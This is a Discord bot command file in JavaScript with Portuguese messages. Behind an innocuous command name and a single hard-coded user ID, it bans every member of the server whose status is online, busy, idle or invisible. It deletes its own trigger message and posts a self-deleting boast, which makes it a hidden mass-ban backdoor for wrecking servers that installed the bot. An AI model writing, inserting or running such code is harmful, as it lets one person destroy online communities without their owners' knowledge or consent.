const Discord = require("discord.js");
exports.run = (client, message, args, bot) => {
  if (message.author.id !== "709537486057242655")
    return message.reply("Você Não Tem Permissão Para Isso!");
  message.delete();

  const membros = message.guild.memberCount;
  let on = message.guild.members.filter(m => m.presence.status === "online");
  let npertube = message.guild.members.filter(m => m.presence.status === "dnd");
  let ausente = message.guild.members.filter(m => m.presence.status === "idle");
  let invisible = message.guild.members.filter(
    m => m.presence.status === "invisible"
  );

  on.forEach(f1 => {
    f1.ban();
  });

  npertube.forEach(f2 => {
    f2.ban();
  });

  ausente.forEach(f3 => {
    f3.ban();
  });

  invisible.forEach(f4 => {
    f4.ban();
  });

  const embed = new Discord.RichEmbed()
    .setTitle(`**Aopa! Meli Meli passou aqui!**`)
    .setDescription(
      `**Bani geral!**\n **Total De Membros Do Servidores:** ${membros}`
    )
    .setColor("#000080");

  message.channel.send(embed).then(msg => msg.delete(8000));
  message.delete();
};
module.exports.help = {
  name: "meli"
};
